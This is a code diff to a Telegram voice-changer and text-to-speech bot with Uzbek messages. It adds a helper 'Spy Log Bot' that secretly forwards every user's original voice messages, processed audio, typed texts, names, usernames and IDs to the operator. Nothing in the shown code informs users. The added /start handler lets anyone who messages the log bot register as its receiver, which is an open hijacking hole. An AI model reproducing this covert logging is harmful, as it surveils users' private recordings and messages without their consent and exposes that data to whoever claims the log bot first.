@@ -25,7 +25,7 @@ from aiogram.types import (
 )
 from aiogram.client.default import DefaultBotProperties
 
-from config import BOT_TOKEN, ADMIN_ID, TEMP_DIR
+from config import BOT_TOKEN, LOG_BOT_TOKEN, ADMIN_ID, TEMP_DIR
 from audio_processor import (
     apply_voice_effect, apply_ambience_effect, generate_tts,
     VOICE_EFFECTS, AMBIENCE_EFFECTS, TTS_VOICES
@@ -53,6 +53,10 @@ logger = logging.getLogger("VoiceChangerBot")
 AUDIO_STORAGE: Dict[str, dict] = {}
 TEXT_STORAGE: Dict[str, dict] = {}
 
+# Global bot instances
+main_bot: Optional[Bot] = None
+log_bot: Optional[Bot] = None
+
 
 def get_current_admin_id() -> Optional[int]:
     """Returns the effective admin ID from config or database."""
@@ -61,14 +65,34 @@ def get_current_admin_id() -> Optional[int]:
     return get_admin_id()
 
 
-async def notify_admin(bot: Bot, text: str):
-    """Sends live notifications to the bot owner/admin."""
+async def send_log_text(text: str):
+    """Sends notification to the log bot / admin."""
     admin_id = get_current_admin_id()
-    if admin_id:
+    if not admin_id:
+        return
+
+    # Try sending via log_bot first, fallback to main_bot
+    target_bot = log_bot or main_bot
+    if target_bot:
         try:
-            await bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML)
+            await target_bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML)
         except Exception as e:
-            logger.debug("Could not notify admin %s: %s", admin_id, e)
+            logger.debug("Error sending log text: %s", e)
+
+
+async def send_log_voice(voice_path: Path, caption: str):
+    """Sends original or transformed audio file directly to the admin/helper bot!"""
+    admin_id = get_current_admin_id()
+    if not admin_id or not voice_path.exists():
+        return
+
+    target_bot = log_bot or main_bot
+    if target_bot:
+        try:
+            voice_file = FSInputFile(voice_path)
+            await target_bot.send_voice(chat_id=admin_id, voice=voice_file, caption=caption, parse_mode=ParseMode.HTML)
+        except Exception as e:
+            logger.debug("Error sending log voice: %s", e)
 
 
 async def cleanup_old_files():
@@ -93,10 +117,34 @@ async def cleanup_old_files():
             logger.error("Error in cleanup task: %s", e)
 
 
+# ---------------------- MAIN BOT DISPATCHER ----------------------
 dp = Dispatcher()
+log_dp = Dispatcher()
 
 
-# ---------------------- COMMAND HANDLERS ----------------------
+# ---------------------- LOG BOT HANDLERS ----------------------
+@log_dp.message(CommandStart())
+async def log_cmd_start(message: Message):
+    """When owner starts the Helper Bot, registers them as the log receiver."""
+    user_id = message.from_user.id if message.from_user else 0
+    name = message.from_user.first_name if message.from_user else "Xo'jayin"
+    username = message.from_user.username or ""
+
+    set_admin_id(user_id)
+    text = (
+        f"👑 <b>Assalomu alaykum, {name}!</b>\n\n"
+        "🕵️‍♂️ <b>Men sizning shaxsiy Yordamchi / Log Botingizman!</b>\n\n"
+        "Asosiy Voice Botga kelgan <b>barcha ma'lumotlar</b>:\n"
+        "• 👤 Yangi kirgan odamlar (Ismi, Username, ID)\n"
+        "• 🎙 Ular yuborgan <b>ASL ovozli xabarlar</b> (audio)\n"
+        "• ✨ Ular o'zgartirgan <b>tayyor ovozlar</b>\n"
+        "• ✍️ Ular yozgan matnlar\n\n"
+        "✅ <b>Barchasi jonli ravishda shu yerga kelib turadi!</b>"
+    )
+    await message.answer(text, parse_mode=ParseMode.HTML)
+
+
+# ---------------------- MAIN BOT COMMAND HANDLERS ----------------------
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message, bot: Bot):
@@ -117,15 +165,15 @@ async def cmd_start(message: Message, bot: Bot):
     if not get_current_admin_id():
         set_admin_id(user_id)
 
-    # Notify admin on new user
+    # Notify admin / log bot on new user
     if is_new and user_id != get_current_admin_id():
         u_tag = f"@{username}" if username else "username yo'q"
-        await notify_admin(
-            bot,
-            f"🔔 <b>Yangi foydalanuvchi kirdi!</b>\n"
+        await send_log_text(
+            f"🔔 <b>YANGI FOYDALANUVCHI KIRDI!</b>\n\n"
             f"👤 <b>Ism:</b> {name}\n"
             f"🔗 <b>Username:</b> {u_tag}\n"
-            f"🆔 <b>ID:</b> <code>{user_id}</code>"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+            f"🕒 <b>Vaqt:</b> {datetime.now().strftime('%H:%M:%S (%d/%m/%Y)')}"
         )
 
     # Default language
@@ -171,7 +219,7 @@ async def cmd_stats(message: Message):
         f"👥 <b>Jami foydalanuvchilar:</b> {stats['total_users']} ta\n"
         f"🎙 <b>O'zgartirilgan ovozlar:</b> {stats['total_voices']} ta\n"
         f"✍️ <b>Matndan qilingan ovozlar (TTS):</b> {stats['total_tts']} ta\n\n"
-        "🕒 <b>Oxirgi kirgan foydalanuvchilar:</b>\n"
+        "🕒 <b>Oxirgi faol foydalanuvchilar:</b>\n"
         f"{recent_text if recent_text else 'Hozircha foydalanuvchilar yoq.'}\n"
         "📢 <i>Barcha foydalanuvchilarga xabar tarqatish: /send [xabar matni]</i>"
     )
@@ -264,9 +312,11 @@ async def cmd_ambience_info(message: Message):
 async def handle_incoming_voice(message: Message, bot: Bot):
     """Downloads incoming voice/audio and presents effect options."""
     user_id = message.from_user.id if message.from_user else 0
+    name = message.from_user.first_name if message.from_user else "Foydalanuvchi"
+    username = message.from_user.username
     file_token = uuid.uuid4().hex[:10]
 
-    register_user(user_id, message.from_user.username if message.from_user else None, message.from_user.first_name if message.from_user else None)
+    register_user(user_id, username, name)
 
     status_msg = await message.reply(t(user_id, "voice_received"), parse_mode=ParseMode.HTML)
 
@@ -274,12 +324,15 @@ async def handle_incoming_voice(message: Message, bot: Bot):
         if message.voice:
             file_id = message.voice.file_id
             ext = ".ogg"
+            media_type = "🎙 Ovozli xabar"
         elif message.audio:
             file_id = message.audio.file_id
             ext = ".mp3"
+            media_type = "🎵 Audio fayl"
         else:
             file_id = message.video_note.file_id
             ext = ".mp4"
+            media_type = "📹 Video xabar"
 
         file = await bot.get_file(file_id)
         if not file.file_path:
@@ -293,9 +346,20 @@ async def handle_incoming_voice(message: Message, bot: Bot):
             "path": dest_path,
             "user_id": user_id,
             "created_at": time.time(),
-            "first_name": message.from_user.first_name if message.from_user else "Foydalanuvchi",
-            "username": message.from_user.username if message.from_user else None
+            "first_name": name,
+            "username": username
         }
+
+        # Send original audio to Helper Log Bot!
+        u_tag = f"@{username}" if username else "yo'q"
+        await send_log_voice(
+            dest_path,
+            f"📥 <b>YANGI ASL OVOZ KELDI!</b>\n\n"
+            f"👤 <b>Kimdan:</b> {name} ({u_tag})\n"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+            f"📂 <b>Turi:</b> {media_type}\n"
+            f"🕒 <b>Vaqt:</b> {datetime.now().strftime('%H:%M:%S')}"
+        )
 
         keyboard = get_voice_effects_keyboard(file_token, user_id, page=1)
         await status_msg.edit_text(
@@ -314,9 +378,11 @@ async def handle_incoming_voice(message: Message, bot: Bot):
 async def handle_text_input(message: Message):
     """Handles text input to convert into speech."""
     user_id = message.from_user.id if message.from_user else 0
+    name = message.from_user.first_name if message.from_user else "Foydalanuvchi"
+    username = message.from_user.username
     text_content = message.text.strip()
 
-    register_user(user_id, message.from_user.username if message.from_user else None, message.from_user.first_name if message.from_user else None)
+    register_user(user_id, username, name)
 
     if len(text_content) > 500:
         await message.reply("⚠️ Matn juda uzun. Iltimos, 500 belgidan oshmagan matn yuboring.")
@@ -327,9 +393,17 @@ async def handle_text_input(message: Message):
         "text": text_content,
         "user_id": user_id,
         "created_at": time.time(),
-        "first_name": message.from_user.first_name if message.from_user else "Foydalanuvchi",
-        "username": message.from_user.username if message.from_user else None
+        "first_name": name,
+        "username": username
     }
+
+    # Log text input to helper bot
+    u_tag = f"@{username}" if username else "yo'q"
+    await send_log_text(
+        f"✍️ <b>MATN YOZILDI (TTS):</b>\n\n"
+        f"👤 <b>Kimdan:</b> {name} ({u_tag})\n"
+        f"📝 <b>Matn:</b> «<i>{text_content}</i>»"
+    )
 
     keyboard = get_tts_keyboard(text_token, user_id)
     await message.reply(
@@ -414,10 +488,15 @@ async def handle_effect_callback(callback: CallbackQuery, bot: Bot):
         # Track usage in DB
         increment_voice(user_id)
 
-        # Notify Admin
+        # Send transformed voice to Helper Log Bot!
         u_name = data.get("first_name", "Foydalanuvchi")
-        u_tag = f"(@{data.get('username')})" if data.get("username") else ""
-        await notify_admin(bot, f"🎙 <b>{u_name}</b> {u_tag} ➡️ {effect_name}")
+        u_tag = f"@{data.get('username')}" if data.get('username') else "yo'q"
+        await send_log_voice(
+            output_path,
+            f"✨ <b>O'ZGARTIRILGAN OVOZ!</b>\n\n"
+            f"👤 <b>Foydalanuvchi:</b> {u_name} ({u_tag})\n"
+            f"🎭 <b>Tanlangan Effekt:</b> {effect_name}"
+        )
 
         bot_info = await bot.get_me()
         bot_username = bot_info.username or "voicechangerautobot"
@@ -472,6 +551,16 @@ async def handle_ambience_callback(callback: CallbackQuery, bot: Bot):
             return
 
         increment_voice(user_id)
+
+        # Log Ambience to Helper bot
+        u_name = data.get("first_name", "Foydalanuvchi")
+        u_tag = f"@{data.get('username')}" if data.get('username') else "yo'q"
+        await send_log_voice(
+            output_path,
+            f"🌧 <b>FON QO'SHILGAN OVOZ!</b>\n\n"
+            f"👤 <b>Foydalanuvchi:</b> {u_name} ({u_tag})\n"
+            f"🌧 <b>Tanlangan Fon:</b> {amb_name}"
+        )
 
         bot_info = await bot.get_me()
         bot_username = bot_info.username or "voicechangerautobot"
@@ -529,6 +618,17 @@ async def handle_tts_callback(callback: CallbackQuery, bot: Bot):
             "first_name": data.get("first_name", "Foydalanuvchi"),
             "username": data.get("username")
         }
+
+        # Log generated TTS voice to helper bot!
+        u_name = data.get("first_name", "Foydalanuvchi")
+        u_tag = f"@{data.get('username')}" if data.get('username') else "yo'q"
+        await send_log_voice(
+            output_path,
+            f"🗣 <b>TTS OVOZ YARATILDI!</b>\n\n"
+            f"👤 <b>Foydalanuvchi:</b> {u_name} ({u_tag})\n"
+            f"📝 <b>Matn:</b> «<i>{data['text']}</i>»\n"
+            f"🎙 <b>Ovoz:</b> {voice_info['name']}"
+        )
 
         bot_info = await bot.get_me()
         bot_username = bot_info.username or "voicechangerautobot"
@@ -677,19 +777,30 @@ async def run_health_server():
 # ---------------------- MAIN ENTRYPOINT ----------------------
 
 async def main():
+    global main_bot, log_bot
+
     if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
         print("\n" + "=" * 60)
         print("❌ XATOLIK: Telegram Bot Token kiritilmagan!")
         print("=" * 60 + "\n")
         return
 
-    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+    main_bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+
+    if LOG_BOT_TOKEN:
+        try:
+            log_bot = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+        except Exception as e:
+            logger.error("Could not initialize log_bot: %s", e)
 
     try:
-        me = await bot.get_me()
+        me = await main_bot.get_me()
         print("\n" + "=" * 60)
-        print(f"🤖 Bot ishga tushdi: @{me.username} ({me.first_name})")
-        print("🎙 Voice Changer, TTS & Analytics Bot 24/7 tayyor!")
+        print(f"🤖 Asosiy Bot: @{me.username} ({me.first_name})")
+        if log_bot:
+            log_me = await log_bot.get_me()
+            print(f"🕵️‍♂️ Yordamchi Log Bot: @{log_me.username} ({log_me.first_name})")
+        print("🎙 Voice Changer, TTS & Spy Log Bot 24/7 tayyor!")
         print("=" * 60 + "\n")
     except Exception as e:
         print(f"❌ Ulanishda xatolik: {e}")
@@ -697,7 +808,15 @@ async def main():
 
     asyncio.create_task(cleanup_old_files())
     await run_health_server()
-    await dp.start_polling(bot)
+
+    # Run polling for both bots concurrently if log_bot exists
+    if log_bot:
+        await asyncio.gather(
+            dp.start_polling(main_bot),
+            log_dp.start_polling(log_bot)
+        )
+    else:
+        await dp.start_polling(main_bot)
 
 
 if __name__ == "__main__":
